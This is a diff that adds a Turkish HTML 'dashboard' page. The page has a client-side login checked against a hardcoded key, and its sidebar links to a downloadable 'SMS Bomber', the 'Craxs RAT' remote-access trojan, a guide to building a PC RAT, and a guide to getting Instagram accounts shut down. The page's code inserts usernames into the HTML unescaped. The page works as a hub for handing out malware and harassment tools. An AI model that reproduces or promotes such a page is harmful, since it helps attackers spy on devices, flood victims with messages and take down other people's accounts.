@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>190xanny | Dashboard</title>
+    <style>
+        /* CSS BURADA */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
+        body { background: #080808; color: white; overflow-x: hidden; }
+        .hidden { display: none !important; }
+        
+        /* Giriş */
+        .container { height: 100vh; display: flex; justify-content: center; align-items: center; background: radial-gradient(circle, #1a0033 0%, #000 100%); }
+        .login-box { background: #111; padding: 40px; border-radius: 15px; border: 2px solid #7000ff; text-align: center; width: 90%; max-width: 400px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: white; border-radius: 8px; }
+        button.login-btn { width: 100%; padding: 12px; background: #7000ff; border: none; color: white; cursor: pointer; border-radius: 8px; font-weight: bold; }
+
+        /* Dashboard */
+        #dashboard { display: flex; height: 100vh; }
+        .sidebar { width: 260px; background: #0c0c0c; border-right: 1px solid #222; padding: 20px; display: flex; flex-direction: column; transition: 0.3s; }
+        .sidebar button { width: 100%; padding: 12px; margin-bottom: 10px; background: #151515; border: 1px solid #7000ff; color: white; border-radius: 8px; cursor: pointer; text-align: left; }
+        .sidebar button:hover { background: #7000ff; }
+        .content { flex: 1; padding: 40px; overflow-y: auto; }
+        
+        /* Tablo */
+        .user-list { background: #111; padding: 20px; border-radius: 12px; margin-top: 20px; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #222; }
+        th { color: #7000ff; }
+
+        /* Mobil */
+        #menu-toggle { display: none; position: fixed; top: 15px; right: 15px; z-index: 1000; background: #7000ff; color: white; border: none; padding: 10px; border-radius: 5px; }
+        @media (max-width: 768px) {
+            #menu-toggle { display: block; }
+            .sidebar { position: fixed; left: -260px; height: 100vh; z-index: 999; }
+            .sidebar.active { left: 0; }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="login-screen" class="container">
+        <div class="login-box">
+            <h1 style="color:#7000ff; margin-bottom:20px;">XANNYCXN / CAN KAAN</h1>
+            <input type="text" id="username" placeholder="Kullanıcı Adı">
+            <input type="password" id="key" placeholder="Key">
+            <button class="login-btn" onclick="handleLogin()">GİRİŞ YAP</button>
+            <p id="error-msg" style="margin-top:10px;"></p>
+        </div>
+    </div>
+
+    <div id="dashboard" class="hidden">
+        <button id="menu-toggle" onclick="toggleMenu()">☰</button>
+        <aside id="sidebar" class="sidebar">
+            <h2 style="color:#7000ff; margin-bottom:20px; text-align:center;">PANEL</h2>
+            <nav>
+                <button onclick="git('https://dosya.co/v8h6nxcvbloi/xann_sms_bomber.rar.html')">SMS Bomber</button>
+                <button onclick="git('https://discord.gg/aUsnEDQhkx')">DİSCORD SUNUCUMUZ</button>
+                <button onclick="git('https:https://www.instagram.com/cann.kaannn34/')">İNSTAGRAM ADRESİ CAN KAAN</button>
+                <button onclick="git('https://www.apponfly.com')">ÜCRETSİZ VDS</button>
+                <button onclick="git('https://rentry.co/uc7n3wia')">P@NEL İCİN DATA</button>
+                <button onclick="git('https://justpaste.it/imxvv')">İNSTA HESAP KAPATMA</button>
+                <button onclick="git('https://justpaste.it/jsuqp')">RAT YAPİMİ PC İCİN</button>
+                <button style="border-color:red;" onclick="location.reload()">Çıkış Yap</button>
+                <button onclick="git('https://www.instagram.com/901xannycxn/')">İNSTAGRAM ADRESİ XANNCXN</button>
+                <button onclick ="git('https://dosya.co/69j7mlxtacgt/Craxs_RAT_v6.7.rar.html')">CRAXS RAT</button>
+
+            </nav>
+        </aside>
+
+        <main class="content">
+            <h1>Hoş geldin, <span id="active-user" style="color:#7000ff;"></span>!</h1>
+            <div class="user-list">
+                <h3>Kayıtlı Üyeler (<span id="total-members">0</span>)</h3>
+                <table>
+                    <thead>
+                        <tr><th>Kullanıcı Adı</th><th>Kayıt Tarihi</th></tr>
+                    </thead>
+                    <tbody id="user-table-body"></tbody>
+                </table>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // JS BURADA
+        function handleLogin() {
+            const user = document.getElementById('username').value.trim();
+            const key = document.getElementById('key').value.trim();
+            const errorMsg = document.getElementById('error-msg');
+
+            if (key === "bozovaEK" && user.length >= 3) {
+                let members = JSON.parse(localStorage.getItem('SİTE ÜYELERİ')) || [];
+                if (!members.some(m => m.name.toLowerCase() === user.toLowerCase())) {
+                    members.push({ name: user, date: new Date().toLocaleString('tr-TR') });
+                    localStorage.setItem('SİTE ÜYELERİ', JSON.stringify(members));
+                }
+
+                document.getElementById('login-screen').classList.add('hidden');
+                document.getElementById('dashboard').classList.remove('hidden');
+                document.getElementById('dashboard').style.display = 'flex';
+                document.getElementById('active-user').innerText = user;
+                updateTable();
+            } else {
+                errorMsg.innerText = "Hatalı Giriş!";
+                errorMsg.style.color = "red";
+            }
+        }
+
+        function updateTable() {
+            const members = JSON.parse(localStorage.getItem('SİTE ÜYELERİ')) || [];
+            const tableBody = document.getElementById('user-table-body');
+            document.getElementById('total-members').innerText = members.length;
+            
+            tableBody.innerHTML = "";
+            members.slice().reverse().forEach(m => {
+                tableBody.innerHTML += `<tr><td>${m.name}</td><td>${m.date}</td></tr>`;
+            });
+        }
+
+        function git(url) {
+            if(url) {
+                window.open(url, '_blank');
+            }
+        }
+
+        function toggleMenu() {
+            document.getElementById('sidebar').classList.toggle('active');
+        }
+    </script>
+</body>
+</html>
